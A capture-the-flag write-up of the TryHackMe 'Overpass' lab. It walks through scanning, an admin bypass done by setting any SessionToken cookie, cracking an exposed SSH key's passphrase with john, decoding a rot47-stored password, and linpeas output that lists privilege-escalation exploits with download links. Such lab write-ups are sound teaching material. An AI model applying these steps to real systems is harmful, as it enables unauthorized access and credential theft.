# Overpass

Laurent Chauvin | October 31, 2022

## Resources

[1] https://www.dcode.fr/rot-47-cipher

[2] https://github.com/berdav/CVE-2021-4034

## Progress

```
export IP=10.10.19.153
```

Nmap scan:
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 16:14 EDT
Nmap scan report for 10.10.19.153
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.95 seconds
```

Gobuster scan:
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.153
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 16:15:55 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /http:/community]
/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /http:/radar]
/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman]
/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /http:/weblog]
/http%3A%2F%2Fswik    (Status: 301) [Size: 0] [--> /http:/swik]
Progress: 220560 / 220561 (100.00%)===============================================================
2022/10/31 16:55:02 Finished
===============================================================
```

Nikto scan:
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.19.153
+ Target Hostname:    10.10.19.153
+ Target Port:        80
+ Start Time:         2022-10-31 16:15:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /admin.html: This might be interesting...
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /downloads/: This might be interesting...
+ OSVDB-3092: /img/: This might be interesting...
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-10-31 16:29:41 (GMT-4) (862 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Get source code from website:
```
wget http://10.10.19.153/downloads/src/overpass.go
```

Source code seems to indicate a rot47 cipher:
```go

//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
```

Credentials seems to be save on file also:
```go

//Encrypt the credentials and write them to a file.
```

Seems to have a function to print all passwords:
```go

func printAllPasswords(passlist []passListEntry) {
	for _, entry := range passlist {
		fmt.Println(entry.Name, "\t", entry.Pass)
	}
}
```

Credentials seems to be saved in home directory in '.overpass' file:
```go

credsPath, err := homedir.Expand("~/.overpass")
```

Website seems to have an admin login page at:
```
http://10.10.19.153/admin.html
```

Let's try gobuster in /admin/:
```

```

Let's get build script from website:
```
wget http://10.10.19.153/downloads/src/buildscript.sh
```

Found this JS code in main.js for admin login:
```js

async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
````

Seems to be looking for a cookie with a 'SessionToken' set.

Let's try a regular GET:
```
curl -L $IP/admin

<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/login.css">
    <link rel="icon" type="image/png" href="/img/overpass.png" />
    <script src="/main.js"></script>
    <script src="/login.js"></script>
    <script src="/cookie.js"></script>
</head>

<body onload="onLoad()">
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a class="current" href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <div class="content">
        <h1>Administrator area</h1>
        <p>Please log in to access this content</p>
        <div>
            <h3 class="formTitle">Overpass administrator login</h1>
        </div>
        <form id="loginForm">
            <div class="formElem"><label for="username">Username:</label><input id="username" name="username" required></div>
            <div class="formElem"><label for="password">Password:</label><input id="password" name="password"
                    type="password" required></div>
            <button>Login</button>
        </form>
        <div id="loginStatus"></div>
    </div>
</body>

</html>         
```

Doesn't work. Now let's try to set the 'SessionToken' cookie:
```
curl -L $IP/admin --cookie "SessionToken=anything" 
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="icon" 
      type="image/png" 
      href="/img/overpass.png" />
    <script src="/main.js"></script>
</head>

<body>
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <h1 class="pageHeading content">Welcome to the Overpass Administrator area</h1>
    <h3 class="subtitle content">A secure password manager with support for Windows, Linux, MacOS and more</h3>
    <div class="bodyFlexContainer content">
        <div>
            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>
</body>

</html>
```

We now have a private ssh key. From the text, it seems we will need to crack it, but let's try to connect with it first.
```
chmod 600 ssh/james_id_rsa
ssh -i ssh/james_id_rsa $IP                                     

The authenticity of host '10.10.19.153 (10.10.19.153)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.19.153' (ED25519) to the list of known hosts.
Enter passphrase for key 'ssh/james_id_rsa': 
```

Indeed we need a passphrase. Let's pass it to john.
```
ssh2john james_id_rsa > james_id_rsa_forJohn.txt
john james_id_rsa_forJohn.txt --wordlist=/opt/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (james_id_rsa)     
1g 0:00:00:00 DONE (2022-10-31 16:42) 5.882g/s 78682p/s 78682c/s 78682C/s lespaul..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Let's ssh now.
```
ssh -i james_id_rsa james@$IP
Enter passphrase for key 'james_id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct 31 20:43:59 UTC 2022

  System load:  0.0                Processes:           87
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.19.153
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
```

Let's get user flag:
```
cat user.txt 

thm{65c1aaf000506e56996822c6281e6bf7}
```

```
cat todo.txt

To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

It seems they stored there password in their own product, overpass, which, as we saw, store them in $HOME/.overpass. Let's check:
```
cat .overpass 

,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

We remember this is a rot47 cipher. Use [1]:
```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

In the .profile we can find this lines:
```
# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
```

If we can write some script with some particular names in ".local/bin", maybe we could run them as root.
From the message in 'todo.txt' it seems the building of overpass is automated. So maybe root is running buildscript.sh automatically with crontab or something like that.

If we could replace buildscript.sh content with anything, we might have privesc.

Uploading linpeas.sh:
```
scp /opt/linpeas.sh james@$IP:/dev/shm

james@10.10.19.153's password: saydrawnlyingpicture
linpeas.sh                                                                                                                                                                                               100%  808KB 170.2KB/s   00:04    
```

Run it.
```
james@overpass-prod:/dev/shm$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.15.0-108-generic (buildd@lcy01-amd64-013) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #109-Ubuntu SMP Fri Jun 19 11:33:10 UTC 2020
User & Groups: uid=1001(james) gid=1001(james) groups=1001(james)
Hostname: overpass-prod
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.15.0-108-generic (buildd@lcy01-amd64-013) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #109-Ubuntu SMP Fri Jun 19 11:33:10 UTC 2020                                                                                    
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.21p2                                                                                                                                                                                                                       

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/usr/local/go/bin                                                                                                                                  
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/usr/local/go/bin

╔══════════╣ Date & uptime
Mon Oct 31 21:20:16 UTC 2022                                                                                                                                                                                                                
 21:20:16 up 3 min,  1 user,  load average: 1.92, 0.97, 0.40

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
/dev/disk/by-id/dm-uuid-LVM-sYqTIK6IK9j2FLnHWmJEZNso2athVc2dVprChlilMt5HbAnc9Iy9ppuqQbeBM6hj    /       ext4    defaults        0 0                                                                                                         
/dev/disk/by-uuid/bdbd6eda-e09a-4198-ae83-f9057b603040  /boot   ext4    defaults        0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                                                                                             
HISTFILESIZE=0
MAIL=/var/mail/james
USER=james
SSH_CLIENT=10.18.23.136 52604 22
SHLVL=1
HOME=/home/james
OLDPWD=/home/james
SSH_TTY=/dev/pts/0
LOGNAME=james
_=./linpeas.sh
XDG_SESSION_ID=1
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/usr/local/go/bin
XDG_RUNTIME_DIR=/run/user/1001
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/dev/shm
SSH_CONNECTION=10.18.23.136 52604 10.10.209.252 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                  

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
                                                                                                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
